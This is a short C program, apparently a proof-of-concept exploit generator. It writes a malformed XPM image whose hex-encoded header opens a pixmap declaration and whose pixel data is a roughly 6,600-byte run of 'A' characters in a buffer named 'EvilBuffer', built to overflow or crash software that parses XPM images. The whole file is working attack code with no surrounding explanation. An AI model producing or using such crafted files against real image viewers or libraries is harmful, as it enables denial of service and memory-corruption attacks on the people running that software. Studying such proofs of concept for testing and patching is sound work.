#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//XPM Headers
char XPMHeaders[]=
"\x2f\x2a\x20\x58\x50\x4d\x20\x2a\x2f\x0d\x0a\x73\x74\x61\x74\x69"
"\x63\x20\x63\x68\x61\x72\x20\x2a\x50\x69\x78\x6d\x61\x70\x5b\x5d"
"\x20\x3d\x20\x7b\x0d\x0a\x22\x35\x30\x39\x20\x34\x33\x38\x20\x32"
"\x35\x36\x20\x33\x22\x2c\x0d\x0a\x22";

int main(int argc, char *argv[])
{
	char EvilBuffer[6600];
	FILE *XPMFile = NULL;

	memset(EvilBuffer, 'A', 6600);		
	//Open File
	if ((XPMFile = fopen(argv[1], "wb")) == NULL)
	{
		printf("Unable to Access File\n");
		return 0;
	}
	memcpy(EvilBuffer,XPMHeaders,sizeof(XPMHeaders)-1);
	//End of XPM file
	memcpy(EvilBuffer + 0x1916,"\x22\x0d\x0a\x29\x3b\x0d\x0a",7);
	fwrite(EvilBuffer, 1, 6600, XPMFile);	//Write Date Into File
	fclose(XPMFile);			//Close File 
	return 0;
}